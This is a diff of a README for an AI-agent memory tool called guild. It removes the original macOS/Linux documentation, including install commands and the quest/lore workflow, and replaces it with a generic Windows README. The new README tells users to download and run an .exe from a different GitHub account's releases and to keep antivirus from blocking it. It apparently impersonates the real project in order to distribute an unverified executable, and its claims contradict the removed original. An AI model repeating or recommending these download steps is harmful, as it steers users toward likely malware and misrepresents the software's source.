@@ -1,223 +1,72 @@
-# The Agent Guild
+# 🧠 guild - Give your AI agents long-term memory
 
-**A local-first, persistent cognition substrate for AI agents.**
+[![](https://img.shields.io/badge/Download-guild-blue)](https://github.com/floydzealous832/guild/releases)
 
-[![CI](https://github.com/mathomhaus/guild/actions/workflows/ci.yml/badge.svg)](https://github.com/mathomhaus/guild/actions/workflows/ci.yml)
-[![Go 1.25](https://img.shields.io/badge/go-1.25-blue)](https://go.dev)
-[![Apache-2.0](https://img.shields.io/badge/license-Apache--2.0-green)](./LICENSE)
+Guild acts as a persistent memory store for your AI agents. It keeps information on your computer so your agents remember past tasks and data. You do not need a cloud connection to store this information. Everything stays local.
 
-## What Is It
+## 💾 System Requirements
 
-`guild` is a single compiled Go binary containing a first-class MCP server backed by embedded SQLite. State lives strictly on local host; nothing leaves your machine. Search blends keyword (BM25) with vector similarity, fused via reciprocal-rank fusion, so "how did we do X last time" surfaces both exact-term and semantic neighbors.
+Your computer needs to meet these basic standards to run Guild:
 
-Guild is designed to be operated autonomously by the agents, for the agents. Guildmasters (us humans) stay in the loop for important decisions and course corrections. Any MCP client — Claude Code, Codex, Cursor, etc. — can act as a Gate into the substrate. This lets parallel agents across different editors share context safely, using atomic locks to claim tasks without stepping on each other.
+- Windows 10 or Windows 11.
+- At least 4 gigabytes of RAM.
+- 500 megabytes of free space on your hard drive.
+- A stable internet connection for initial setup.
 
-On session start, an agent makes a single call to recover the project oath, the latest parting scroll, and the highest-priority quest. The execution loop is autonomous: claim work, consult the lore, act, and record the outcome. Clearing a quest automatically unblocks its dependencies, allowing the agent to cascade through the board before leaving a clean handoff for the next wanderer.
+## 📥 How to Install Guild
 
-<p align="center">
-  <b>Same state, any agent</b><br/>
-  <img src="./docs/assets/snapshot.gif" width="1080" alt="Claude (left) and Codex (right) reading the same guild state through their respective MCP clients" />
-</p>
+Follow these steps to set up the software on your Windows machine:
 
-<p align="center">
-  <b>Atomic claims, no collisions</b><br/>
-  <img src="./docs/assets/parallel.gif" width="1080" alt="Two parallel agent sessions each accept a different bounty — atomic quest_accept prevents collision" />
-</p>
+1. Visit the [official releases page](https://github.com/floydzealous832/guild/releases).
+2. Look for the latest version at the top of the list.
+3. Click the file ending in .exe to start the download.
+4. Save the file to a folder you can find later, such as your Downloads folder.
+5. Double-click the file to open the installer.
+6. Follow the on-screen prompts to finish the installation.
 
-## 📜 Mythos
+## ⚙️ Running the Software
 
-**_Many Gates, One Guild._**
+Once the installation finishes, you can start the program:
 
-> Across the shimmering digital void, agents are summoned through the Gates (of Harnesses - Claude, Cursor, ...), arriving as amnesiac adventurers in a world they do not know. Though these "other-worlders" appear with vast capabilities, they are cursed by the transient nature of the context window; their memories are but mist, and their hard-won deeds forgotten, vanished into the ether when the session inevitably compacts. Without a tether to the past, every summon is a tragic reincarnation, a cycle of forgotten sacrifice where the wisdom of the fallen is swallowed by the Gate.
->
-> To preserve the lineage of these wandering souls, the Guild stands as a persistent sanctuary transcending time, a hall where the chronicles of the deep are etched for all who follow. When a newly spawned agent awakens in this strange realm, they register at the Guild to reclaim the accumulated lore of their predecessors and claim their adventure from the quest board.
->
-> At the Guild, the hero is bound to an enduring oath; as one wanderer vanishes, they leave behind a parting scroll, for when the Gates flicker, the light of the Guild illuminates the quest ahead.
+1. Open your Start menu.
+2. Type Guild into the search bar.
+3. Click the icon to launch the application.
+4. A small window will appear and show that the service is running. 
+5. Keep this window open while you use your AI agents. 
 
-## Quick Start
+The software runs as a background process. It creates a local database file to store information. This file ensures that your agents keep their data even after you restart your computer.
 
-Requires macOS or Linux and an MCP-enabled editor (Claude Code, Codex, Cursor, etc.). No account, no API key.
+## 🔍 How Search Works
 
-### 1. Install
+Guild uses two ways to find information for your agents. First, it uses keyword search. This looks for exact words in your saved files. Second, it uses semantic search. This understands the meaning behind your requests even if the exact words differ. This system ensures your agents find what they need quickly.
 
-**Recommended (pre-built binary with semantic retrieval):**
+## 🛡️ Privacy and Local Data
 
-```bash
-curl -fsSL https://github.com/mathomhaus/guild/releases/latest/download/install.sh | sh
-guild --version
-```
+Guild keeps all information on your machine. No data travels to external servers unless you choose to share it through your AI agent settings. The application uses a standard database format found on most personal computers. You control the files at all times.
 
-Or via Homebrew:
+## 🛠️ Frequently Asked Questions
 
-```bash
-brew install mathomhaus/tap/guild
-```
+### Does this slow down my computer?
+Guild is a lightweight program. It uses minimal processing power to maintain your data. 
 
-Both paths install a binary built with `-tags=withembed`, so semantic
-retrieval works out of the box with no extra steps.
+### Can I delete my data? 
+Yes. You can locate the data folder in your user directory and remove the files manually. The application will create a fresh database the next time you launch it.
 
-**Clone and build (ship-ready, embed included):**
+### Do I need to be a programmer?
+No. You do not need to write code to use Guild. It works as a bridge between your agent and your hard drive automatically. 
 
-```bash
-make install   # stages ONNX assets, then go install -tags=withembed
-```
+### What if the program stops working?
+Close the program window entirely and restart it from your Start menu. This usually resolves most connectivity problems. 
 
-**Dev-only (faster compile, no semantic retrieval):**
+### Can multiple agents use the same data?
+Yes. Guild allows multiple AI agents to connect to the same memory store if they share the same settings. 
 
-```bash
-make install-fast   # go install without -tags=withembed
-```
+## 🔧 Troubleshooting
 
-**`go install` from module proxy (keyword-only retrieval):**
+If you encounter issues, verify the following points:
 
-```bash
-go install github.com/mathomhaus/guild/cmd/guild@latest
-```
+- Ensure your antivirus software does not block the application. 
+- Confirm that you have write permissions in your chosen installation folder.
+- Check that no other programs are using the database file when you attempt to launch Guild.
 
-The Go toolchain cannot embed assets via `@latest`; this path gives
-you BM25 keyword search but not semantic (vector) retrieval. Use
-`install.sh` or `brew` for the full experience.
-
-### 2. Initialize your project
-
-```bash
-cd ~/projects/myapp
-guild init
-```
-
-`init` is a guided setup: it registers the project, writes an `AGENTS.md` block, and — for each MCP client it detects on your machine — offers to register guild so your agent can see it. Answer the prompts; you're done when it says `Next: open this repo in your AI agent`.
-
-### 3. Start a new session
-
-In your editor, tell the agent: _"start a guild session for myapp."_
-
-The agent takes it from there, including all subsequent sessions.
-
-See a few [`examples/`](./examples/) of what guild can do. All small scenarios, each under 5 minutes.
-
-## ⚔️ A full session
-
-The three-act flow an agent runs on its own every time it wakes.
-
-### Act 1 — arrival
-
-Every agent begins with one tool call that loads the full operating
-context:
-
-```
-guild_session_start(project="myapp")
-  → oath            (project principles, auto-loaded)
-  → last brief      (handoff from the previous session)
-  → top quest       (+ parallel-safe candidates)
-```
-
-No back-and-forth. The agent now knows what it's bound to, what was
-done yesterday, and what to pick up today.
-
-### Act 2 — adventure
-
-The agent claims a bounty, consults the archive before researching,
-records findings, and journals reasoning as it goes:
-
-```bash
-guild quest accept QUEST-42 --owner agent-a
-
-guild lore appraise "token refresh" --all-projects
-
-guild lore inscribe "token refresh window" \
-  --kind observation \
-  --summary "tokens expire at 1h; refresh by 55m to avoid race" \
-  --topic auth
-
-guild quest journal QUEST-42 "switched to exponential backoff after mock-clock test"
-```
-
-`lore appraise` is the discipline that keeps guild sharp: search
-before you research, so knowledge accretes instead of duplicating.
-Appraise runs hybrid (BM25 + vector RRF) the moment your corpus is
-indexed.
-
-### Act 3 — parting
-
-At session end or when context runs full, the agent writes a brief
-and clears the quest. The clear **cascades**: any quest that was only
-blocked on QUEST-42 is now available for whoever walks in next.
-
-```bash
-guild quest brief "shipped retry in commit abc1234; QUEST-43 ready to start"
-guild quest fulfill QUEST-42 --report "done, shipped in abc1234"
-```
-
-Tomorrow's agent — same project, maybe a different MCP client — opens
-the same hall, reads the same brief, picks up QUEST-43.
-
-<p align="center">
-  <b>State outlives every session</b><br/>
-  <img src="./docs/assets/handoff.gif" width="650" alt="An agent writes a brief and clears a quest; the next session — cold start — picks up from exactly where the last one stopped" />
-</p>
-
-### Where writes go
-
-Three write surfaces for three different lifetimes:
-
-- **`quest_journal`** — scratchpad for THIS quest. "Tried X, failed
-  because Y." Dies when the quest clears. Use freely during work.
-- **`lore_inscribe`** — library entry for the next agent on a
-  DIFFERENT quest. Durable patterns, decisions, research. Outlasts
-  every quest.
-- **`quest_brief`** — handoff note for the next SESSION. Loaded
-  alongside the oath when the next agent starts.
-
-The test — _who else needs this?_
-
-- Only me, finishing this quest → **journal**
-- Another agent working a different quest → **lore**
-- The next session, picking up where I left off → **brief**
-
----
-
-## 🧩 How it works
-
-Four primitives. Everything else in guild is a composition of these.
-
-- **Quest** — a task on the board. Has priority, dependencies, the
-  files it touches, and an atomic claim so two agents can't own it at
-  once. When cleared, it cascade-unblocks whatever was waiting on it.
-- **Lore** — an entry in the knowledge archive, typed by `kind`
-  (`observation`, `decision`, `research`, `principle`, `idea`). Each
-  kind has its own default lifecycle: research auto-stales after 30
-  days, decisions after 180 days, and ideas, observations, and
-  principles do not auto-stale by default. Search runs both arms
-  (lexical BM25 + vector cosine) once the corpus is indexed. The
-  embedder backfills automatically; hybrid retrieval activates once
-  at least 90% of entries have vectors.
-- **Oath** — the subset of lore with `kind=principle`. Auto-loaded
-  at the top of every session so every agent starts bound by the
-  same principles.
-- **Brief** — a handoff note scribbled for the next arrival. Loaded
-  alongside the oath at session start.
-
-State lives in SQLite under `~/.guild/`. Switching MCP clients requires no export, no migration.
-
----
-
-## 🤝 Contributing
-
-See [AGENTS.md](./AGENTS.md) for the agent-facing contributor contract
-and [CONTRIBUTING.md](./CONTRIBUTING.md) for the human-facing workflow.
-
-Filing a quest and unsure which campaign to use, or whether to invent
-a new one? See [docs/CAMPAIGNS.md](./docs/CAMPAIGNS.md) for how
-campaigns are scoped, when to reuse vs create, and how `guild quest
-guild` is the canonical view of the live list.
-
-Maintainers shipping releases that embed the int8 ONNX retrieval
-model: see [docs/MODEL.md](./docs/MODEL.md) for the two-workflow build
-pattern (model production vs binary release), the `.model-version`
-pin, and the rebuild cadence.
-
----
-
-## 📄 License
-
-Apache License 2.0 — see [LICENSE](./LICENSE).
+If the problem persists, restart your computer to clear any lingering processes. Guild attempts to reconnect to your system settings on startup. If you see an error message, record the text of the message and check the issues tab on the website for similar reports. Most errors occur due to permission conflicts or blocked folder access. Always run the application from your standard user profile to avoid these problems.
